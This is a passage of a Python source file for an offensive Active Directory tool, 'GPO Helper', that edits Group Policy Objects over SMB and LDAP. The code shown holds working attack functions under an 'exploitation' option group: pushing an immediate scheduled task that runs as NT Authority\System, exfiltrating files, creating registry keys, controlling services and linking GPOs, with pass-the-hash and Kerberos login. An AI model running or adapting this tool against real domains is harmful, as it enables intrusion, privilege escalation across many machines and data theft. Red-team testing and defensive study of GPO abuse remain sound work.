        self.updateGUID(info, k, ['Group Policy Services', 'Services'], dn)

    def GPOImmTask(self, taskname, author, description, location, user, gpo):
        (path, info, dn) = self.extractInfo(gpo)

        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

        template = self.template_task.replace("CHANGEME_TASKNAME", taskname)
        now = datetime.now()
        date = now.strftime("%Y-%m-%d %H:%M:%S")
        template = template.replace("CHANGEME_TIMESTAMP", date)
        template = template.replace("CHANGEME_UID", self.generateGUID())
        template = template.replace("CHANGEME_CONTEXT", self.context)
        template = template.replace("CHANGEME_AUTHOR", author)
        template = template.replace("CHANGEME_DESCRIPTION", description)
        template = template.replace("CHANGEME_LOCATION", location)
        template = template.replace("CHANGEME_USER", user)
        if self.smbconn == '':
            self.conn2smb()

        if "Scheduled Tasks" in info[0]:
            k = ""
            try:
                orig = self.SMBReadFile(xmlPath)
                modified = orig.replace(b'</ScheduledTasks>', bytes(template.encode("utf-8")))
                self.SMBWriteFile(xmlPath, modified)
            except:
                raise
        else:
            k = "Scheduled Tasks"
            try:
                self.smbconn.createDirectory('Sysvol', path + "\\"+ self.gpopath + "\\Preferences\\ScheduledTasks")
            except:
                pass
            orig = bytes(self.template_task_new.encode("utf-8"))
            modified = orig.replace(b'</ScheduledTasks>', bytes(template.encode("utf-8")))
            self.SMBWriteFile(xmlPath, modified)
        self.updateGUID(info, k, ['Group Policy Scheduled Tasks', 'Scheduled Tasks'], dn)

    def get_machine_name(self,args, domain):
        if args.dc_ip is not None:
            s = SMBConnection(args.dc_ip, args.dc_ip)
        else:
            s = SMBConnection(domain, domain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % domain)
        else:
            s.logoff()
        return s.getServerName()

def parse_args():
    parser = argparse.ArgumentParser(add_help = True, description = "GPO Helper - @TheXC3LL")
    
    auth_con = parser.add_argument_group('authentication & connection')
    auth_con.add_argument('-u', '--username', action="store", default='', help='valid username')
    auth_con.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    auth_con.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    auth_con.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
    auth_con.add_argument('-dc-ip', action="store", metavar = "ip address / hostname", help='IP Address of the domain controller or the fqdn use when -k')
    auth_con.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
    parser.add_argument('-no-pass', action='store_true', help='tell the script to not use password, good with -k')
    auth_con.add_argument('-k', action="store_true", help='Tell the script to use kerberos auth')

    enumeration = parser.add_argument_group("enumeration")
    enumeration.add_argument('-listgpo', action="store_true", help='Retrieve GPOs info using LDAP')
    enumeration.add_argument('-listsite', action="store_true", help="Retrieve SITE info using LDAP")
    enumeration.add_argument('-listou', action="store_true", help="Retrieve OU info using LDAP")
    enumeration.add_argument('-listdomain', action="store_true", help="Retrieve info from the domain object, such as the gPLink one")
    enumeration.add_argument('-displayname', action="store", metavar = "display name", help='Filter using the given displayName [only with -listgpo]')
    enumeration.add_argument('-listgplink', action="store_true", help='Retrieve the objects the GPO is linked to')
    
    gpo_modification = parser.add_argument_group("Creation / Deletion / Linking")
    gpo_modification.add_argument('-linkgpotoou', action="store_true", help='Tell the script to link a gpo to a OU, the OU needs to be passed at -ouname and a gpo with -name')
    gpo_modification.add_argument('-linkgpotosite', action="store_true", help='Tell the script to link a gpo to a SITE, the SITE needs to be passed at -sitename and a gpo with -name')
    gpo_modification.add_argument('-linkgpotodomain', action="store_true", help='Tell the script to link a gpo to a DOMAIN, the DOMAIN needs to be passed at -d and a gpo with -name')
    gpo_modification.add_argument('-removelinkou', action="store_true", help="tell the script to remove a gpo link from a OU, needs to be passed at -ouname and a gpo with -name")
    gpo_modification.add_argument('-removelinkdomain', action="store_true", help="tell the script to remove a gpo link from a DOMAIN, needs to be passed at -d and a gpo with -name")
    gpo_modification.add_argument('-removelinksite', action="store_true", help="tell the script to remove a gpo link from a SITE, needs to be passed at -sitename and a gpo with -name")
    gpo_modification.add_argument('-creategpo', action="store_true", help="tell the script to create a gpo")
    gpo_modification.add_argument('-deletegpo', action="store_true", help="tell the script to remove a gpo")
    gpo_modification.add_argument('-comment', action="store", help="Tell the script to add a GPO.cmt with a text to the new created gpo.")
    
    general = parser.add_argument_group("General parameters that can be passed to multiple commands")
    general.add_argument('-ou', action="store", metavar = 'GPO name', help='Filter using the ou [only with -listgplinks]')
    general.add_argument('-name', action="store", metavar = 'GPO name', help='Filter using the GPO name ({Hex}) or gpo name to add,delete when using -creategpo / -deletegpo')
    general.add_argument('-ouname', action="store", metavar="ouname", help='Tell the script what OU to link the gpo')
    general.add_argument('-sitename', action="store", metavar="sitename", help='Tell the script what SITE to link the gpo')
    general.add_argument('-gpcuser', action="store_true", help="GPO is related to users")
    general.add_argument('-gpcmachine', action="store_true", help="GPO is related to machines")
    
    backup = parser.add_argument_group("backup")
    backup.add_argument('-backup', action="store", metavar="Backup location", help="Location of backup folder")
    
    exploitation = parser.add_argument_group("exploitation")
    exploitation.add_argument('-gpocopyfile', action="store_true", help='Edit the target GPO to copy a file to the target location')
    exploitation.add_argument('-gpomkdir', action="store_true", help='Edit the target GPO to create a new folder')
    exploitation.add_argument('-gporegcreate', action = "store_true", help='Edit the target GPO to create a registry key/subkey')
    exploitation.add_argument('-gposervice', action="store_true", help='Edit the target GPO to start/stop/restart a service')
    exploitation.add_argument('-gpoexfilfiles', action="store_true", help='Edit the target GPO to exfil a file (* to all) to the target location')
    exploitation.add_argument('-gpoimmtask', action="store_true", help='Edit the target GPO to add a Immediate Task')
    exploitation.add_argument('-gpoimmuser', action="store", metavar="User for ImmTask", help="User to run the immediate task")
    exploitation.add_argument('-srcpath', action="store", metavar='Source file', help='Local file path')
    exploitation.add_argument('-dstpath', action="store", metavar='Destination path', help='Destination path')
    exploitation.add_argument('-hive', action="store", metavar='Registry Hive', help="Registry Hive")
    exploitation.add_argument('-type', action="store", metavar='Type', help="Type of value")
    exploitation.add_argument('-key', action="store", metavar='Registry key', help="Registry key")
    exploitation.add_argument('-subkey', action="store", metavar='Registry subkey', help="Registry subkey")
    exploitation.add_argument('-default', action="store_true", help="Sets new value es default")
    exploitation.add_argument('-value', action="store", metavar="Registry value", help="Registry value")
    exploitation.add_argument('-service', action="store", metavar="Target service", help="Target service to be started/stopped/restarted")
    exploitation.add_argument('-action', action="store", metavar="Service action", help="Posible values: start, stop & restart")
    exploitation.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
    exploitation.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
    exploitation.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
    exploitation.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
    exploitation.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")

    return parser.parse_args()

def main():

    options = parse_args()

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True and options.k is not True and options.aesKey is None:
        from getpass import getpass
        options.password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = None
        nthash = None

    if options.gpcuser is True:
        scope = "gPCUserExtensionNames"
    elif options.gpcmachine is True:
        scope = "gPCMachineExtensionNames"
    else:
        print("[!] Error. Need -gpcuser or -gpcmachine!")
        exit(-1)

    if options.usercontext is True:
        context = str(1)
    else:
        context = str(0)
    helper = GPOhelper(options.username, options.password, options.domain, lmhash, nthash, options.dc_ip, scope, context, options.k, options.aesKey, options)

    # -listsite
    if options.listsite is True:
        name = '*'
        if options.name is not None:
            name = options.name
        records = helper.ldapGPOFromSiteInfo(name)
        for x in records:

            objectGUID = x["objectGUID"]
            if isinstance(x["objectGUID"].raw_values[0], bytes):
                objectGUID = uuid.UUID(bytes_le=x["objectGUID"].raw_values[0])

            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], objectGUID, x['objectcategory']))

    # -listou
    if options.listou is True:
        name = '*'
        if options.name is not None:
            name = options.name
        records = helper.ldapGPOFromOUInfo(name)
        for x in records:
            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], x["objectGUID"], x['objectcategory']))

    # -listdomain
    if options.listdomain is True:
        name = '*'
        if options.name is not None:
            name = options.name
        if options.domain is None:
            print("[-] A -domain needs to be passed")
            sys.exit(1)
        records = helper.ldapGPOFromDomainInfo(name)
        for x in records:
            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s\n\t[-] objectGUID: %s\n\t[-] objectcategory: %s" % (x["Name"], x["distinguishedName"], x["gPLink"], x["objectGUID"], x['objectcategory']))

    # -listgpo
    if options.listgpo is True:
        displayname = '*'
        name = '*'
        if options.displayname is not None:
            displayname = options.displayname
        if options.name is not None:
            name = options.name
        records = helper.ldapGPOInfo(displayname, name)
        for x in records:
            print("\n[+] Name: %s\n\t[-] displayName: %s\n\t[-] gPCFileSysPath: %s\n\t[-] %s: %s\n\t[-] versionNumber: %s" % (x["Name"], x["displayName"], x["gPCFileSysPath"], scope, x[scope],  x["versionNumber"]))
            guidinfo = helper.GUID2info(x[scope])
            print("\t[-] Verbose: ")
            for y in guidinfo:
                print("\t\t---\t\t---")
                for z in y:
                    print("\t\t" + z)

    # -listgplink
    if options.listgplink is True:
        name = "*"
        ou = "*"
        if options.name is not None:
            name = "*" + options.name + "*"
        if options.ou is not None:
            ou = "*" + options.ou + "*"
        records = helper.ldapGplinkInfo(ou, name)
        for x in records:
            print("\n[+] Name: %s\n\t[-] distinguishedName: %s\n\t[-] gPLink: %s" % (x["Name"], x["dn"], x["gPLink"]))

    # -linkgpotoou
    if options.linkgpotoou is True:

        if options.name == None or options.ouname == None:

            print("[-] A -name and -ouname needs to be passed")
            exit(1)

        helper.LinkGPOTOOU(options.ouname, options.name)

    # -linkgpotodomain
    if options.linkgpotodomain is True:
        if options.name == None or options.domain == None:
            print("[-] A -name and -domain needs to be passed")
            exit(1)

        helper.LinkGPOTODOMAIN(options.name)

    # -removelinkdomain
    if options.removelinkdomain is True:

        if options.name == None or options.domain == None:

            print("[-] A -name and -domain needs to be passed")
            exit(1)

        helper.RemoveLinkDOMAIN(options.name)

    # -removelinkou
    if options.removelinkou is True:

        if options.name == None or options.ouname == None:

            print("[-] A -name and -ouname needs to be passed")
            exit(1)

        helper.RemoveLinkOU(options.ouname, options.name)   

    # -linkgpotosite
    if options.linkgpotosite is True:

        if options.name == None or options.sitename == None:

            print("[-] A -name and -sitename needs to be passed")
            exit(1)

        helper.LinkGPOTOSITE(options.sitename,options.name)

    # -removelinksite
    if options.removelinksite is True:

        if options.name == None or options.sitename == None:

            print("[-] A -name and -sitename needs to be passed")
            exit(1)

        helper.RemoveLinkSITE(options.sitename,options.name)

    # -creategpo
    if options.creategpo is True:

        if options.name == None:

            print("[-] A -name to create a gpo is necessary.")
            exit(1)

        if helper.CheckForDuplicates(options.name) == False:

            helper.CreateGPO(options.name)
            exit(0)

        exit(1)


    # -deletegpo
    if options.deletegpo is True:

        if options.name == None:

            print("[-] A -name to delete a gpo is necessary.")
            exit(1)

        helper.DeleteGPO(options.name)
        exit(0)

    # -gpocopyfile
    if options.gpocopyfile is True:
        if options.srcpath is None or options.dstpath is None or options.name is None:
            print("[!] Error! -gpocopyfile requires -name, -srcpath and -dstpath parameters")
            exit(-1)
        helper.GPOCopyFile(options.srcpath, options.dstpath, 0, options.name)
        helper.updateVersion(options.name)
    
    # -gpoexfilfiles
    if options.gpoexfilfiles is True:
        if options.srcpath is None or options.dstpath is None or options.name is None:
            print("[!] Error! -gpoexfilfiles requires -name, -srcpath and -dstpath parameters")
            exit(-1)
        helper.GPOExfilFiles(options.srcpath, options.dstpath, 0, options.name)
        helper.updateVersion(options.name)


    # -gpomkdir
    if options.gpomkdir is True:
        if options.dstpath is None or options.name is None:
            print("[!] Error! -gpomkdir requires -name and -dstpath parameters")
            exit(-1)
        helper.GPOCreateFolder(options.dstpath, 0, options.name)
        helper.updateVersion(options.name)

    # -gporegcreate
    if options.gporegcreate is True:
        if options.hive is None or options.key is None or options.type is None or options.value is None or options.name is None:
            print("[!] Error! -gporegcreate requires -name, -hive, -key, -type, -value as minium. Optional: -subkey, -default")
            exit(-1)
        if options.subkey is None:
            subkey = ""
        else:
            subkey = options.subkey
        if options.default is None:
            default = "0"
        else:
            default = "1"

        helper.GPORegCreate(options.hive, options.key, subkey, options.type, options.value, default, options.name)
        helper.updateVersion(options.name)

    # -gposervice
    if options.gposervice is True:
        if options.service is None or options.action is None or options.name is None:
            print("[!] Error! -gposervice requires -name, -action and -service parameters")
            exit(-1)
        action = options.action.upper()
        if action not in ['START', 'STOP', 'RESTART']:
            print("[!] Error! -action values: start/stop/restart")
            exit(-1)

        helper.GPOService(action, options.service, options.name)
        helper.updateVersion(options.name)

    # -gpoimmtask
    if options.gpoimmtask is True:
        if options.author is None or options.taskdescription is None or options.taskname is None or options.dstpath is None or options.name is None:
            print("[!] Error! -gpoimmtask requires -name, -author, -taskname, -taskdescription and -dstpath parameters")
            exit(-1)
        if options.gpoimmuser != None:
            user = options.gpoimmuser
        else:
            user = "NT Authority\\System"
        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, user, options.name)
        helper.updateVersion(options.name)

    # -gpoupdatever
    if options.gpoupdatever is True:
        if options.name is None:
            print("[!] Error! -gpoupdatever requires -name parameter")
            exit(-1)
        helper.updateVersion(options.name)

    # -backup
    if options.backup is not None:
        if options.name is None:
            print("[!] Error! -backup requires -name parameter")
            exit(-1)
        helper.GPOBackup(options.backup, options.name)

if __name__ == "__main__":
    print("\t\tGPO Helper - @TheXC3LL")
    print("\t\tModifications by - @Fabrizzio53\n\n")

    main()
    print("\n[^] Have a nice day!")
